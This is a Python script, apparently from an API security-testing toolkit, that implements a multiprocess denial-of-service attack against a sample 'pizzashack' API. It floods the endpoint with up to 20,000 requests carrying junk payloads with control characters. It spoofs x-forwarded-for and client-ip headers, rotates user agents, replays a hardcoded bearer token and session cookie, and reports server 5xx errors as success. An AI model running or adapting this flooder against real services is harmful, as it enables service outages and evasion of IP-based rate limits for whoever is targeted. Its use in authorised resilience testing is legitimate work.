import os
import requests
import sys
import random
import re
import time
import multiprocessing
import ctypes
from datetime import datetime
from collections import defaultdict
from multiprocessing import Pool


# disabling warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Generates random ascii string of given size.
def generate_random_string(size):
    out_str = ''
    for i in range(size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


def set_flag(val):
    flag.value = val


def set_status(val):
    status[:] = val


def inc_counter():
    counter.value += 1


def inc_fault():
    fault.value += 1


def init(ctr, sts, fg, flt, time,requests):
    global counter, status, flag, fault, start_time, number_of_requests
    counter = ctr
    status = sts
    flag = fg
    fault = flt
    start_time = time
    number_of_requests = requests


def send_request(num):
    inc_counter()
    code = 0
    api = attack_instance.api
    urlc = attack_instance.urlc
    if urlc.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"

    random_user = random.choice(attack_instance.users)
    resource_tuple = random.choice(list(api.resources.items()))
    method = resource_tuple[0]
    resource_path_list_for_a_method = resource_tuple[1]
    resource = random.choice(resource_path_list_for_a_method)

    header_data = {
        'User-Agent': random.choice(attack_instance.headers_user_agents),
        'accept': 'application/json',
        'client-ip': '{}'.format(random_user.ip),
        'x-forwarded-for': '{}'.format(random_user.ip),
        'cookie': '{}'.format(random_user.cookie),
        'Authorization': 'Bearer {}'.format(random_user.token)
    }

    urlreq = urlc + '/' + resource + param_joiner + generate_random_string(random.randint(random.randint(0, 3), random.randint(4, 10))) + '=' + generate_random_string(
        random.randint(random.randint(0, 3), random.randint(4, 10)))

    try:
        if method == 'GET':
            r = requests.get(url=urlreq, headers=header_data, timeout=(15, 30),verify=False)
        elif method == 'POST':
            r = requests.post(url=urlreq, headers=header_data, data=attack_instance.dt[num], timeout=(15, 30),verify=False)
        elif method == 'PUT':
            r = requests.put(url=urlreq, headers=header_data, data=attack_instance.dt[num], timeout=(15, 30),verify=False)
        elif method == 'DELETE':
            r = requests.delete(url=urlreq, headers=header_data, data=attack_instance.dt[num], timeout=(15, 30),verify=False)
        elif method == 'PATCH':
            r = requests.patch(url=urlreq, headers=header_data, data=attack_instance.dt[num], timeout=(15, 30),verify=False)

        if (str(r.status_code) == '500') or (str(r.status_code) == '503') or (str(r.status_code) == '504'):
            set_flag(1)
            print('Successful.')
            code = 500
        elif str(r.status_code) == '400':
            print('Url has DDoS protection.')
            sys.exit()
        elif str(r.status_code) == '404':
            print('Url does not exist.')
            sys.exit()
        elif str(r.status_code) == '429':
            print('Slowing down due to "Too many requests" error.', flush=True)
            time.sleep(20)
        elif str(r.status_code) == '405':
            r = requests.get(url=urlreq, headers=header_data, timeout=(15, 30))
        elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):  # For other unexpected HTTPS errors, prints the error code.
            print(str(r.status_code))
        elif counter.value >= number_of_requests.value:
            code = "Done"
        else:
            print('Sending crafted request: %s' % urlreq, flush=True)

    except Exception as e:
        print(str(e))
        inc_fault()
    return code


def handler_time(i):
    attack_instance.corrupt()
    # attack_instance.useragent_list()
    if datetime.now().timestamp() <= start_time.value + 5 * 60:
        if flag.value < 2:
            code = send_request(i)
            if code == 500:
                set_flag(2)
                set_status("successly. ")
            print("%d Requests Sent" % counter.value, flush=True)


def handler(i):
    attack_instance.corrupt()
    attack_instance.useragent_list()
    if i < 10000 + fault.value:
        if flag.value < 2:
            code = send_request(i)
            if code == 500:
                set_flag(2)
                set_status("successly. ")
            print("%d Requests Sent" % counter.value, flush=True)


def attack():
    print("-- DOS Attack Started --")
    start_time = multiprocessing.Value('f', datetime.now().timestamp())
    counter = multiprocessing.Value('i', 0)
    status = multiprocessing.Array(ctypes.c_wchar_p, ' but failed.')
    flag = multiprocessing.Value('i', 0)
    fault = multiprocessing.Value('i', 0)
    number_of_requests = multiprocessing.Value('i',20000)

    p = Pool(processes=20, initializer=init, initargs=(counter, status, flag, fault, start_time,number_of_requests))
    p.map_async(handler_time, range(number_of_requests.value + fault.value))
    p.close()
    p.join()

    print("\n-- DOS Attack Finished %s--" % ''.join(status[:]))


class User:
    def __init__(self, ip, token, cookie):
        self.ip = ip
        self.token = token
        self.cookie = cookie


class API:
    def __init__(self, protocol, host, port, context, version, name):
        self.protocol = protocol
        self.host = host
        self.port = port
        self.context = context
        self.name = name
        self.version = version
        self.resources = defaultdict(list)
        self.base_url = "{}://{}:{}/{}/{}".format(protocol, host, port, context, version)

    def add_resource(self, method, path):
        self.resources[method].append(path)


class DOSAttackData:

    # Initialisation.
    def __init__(self, api, ip_list):
        self.headers_user_agents = []
        self.headers_referers = []
        self.ip_list = ip_list
        self.dt = []
        self.api = api
        self.urlc = api.base_url
        self.users = []
        if self.urlc.count("/") == 2:
            self.urlc += "/"
            m = re.search('https?\://([^/]*)/?.*', self.urlc)
            self.host = m.group(1)
        else:
            self.host = ""

    # Generates a List of UserAgent headers.
    def useragent_list(self):
        path = os.path.abspath(os.path.join(__file__, "../../conf/user agents.txt"))
        with open(path, "r") as file:
            self.headers_user_agents = list(map(str.strip, file.readlines()))
        return self.headers_user_agents

    def parse_users(self, user_list):
        for user in user_list:
            self.users.append(User(user[0], user[1], user[2]))

    # Generates arbitrary data.
    def corrupt(self):
        for i in range(number_of_requests.value):
            self.dt.append(generate_random_string(random.randint(1, 3)) + random.choice(['\a', '\n', '\t', '\b', '\r', '\f']) + generate_random_string(random.randint(1, 3)))


# Launcher.
if __name__ == "__main__":
    print(datetime.now())
    url = "http://10.100.8.34:9000"
    ip_list = ['169.185.105.92']
    user_data = [['169.185.105.92', 'bbf9a4b5-fe8f-3194-bfb7-afc511f0d89b', 'JSESSIONID=3k3pfs52tqdkvd16gpvkc4c5dfurwiq']]  # ip,token,cookie

    api = API("https", "172.18.0.1", "8243", "pizzashack", "1.0.0", "Maps")
    api.add_resource("GET", "menu")
    api.add_resource("POST", "order")
    attack_instance = DOSAttackData(api, ip_list)
    attack_instance.useragent_list()
    attack_instance.parse_users(user_data)
    attack()
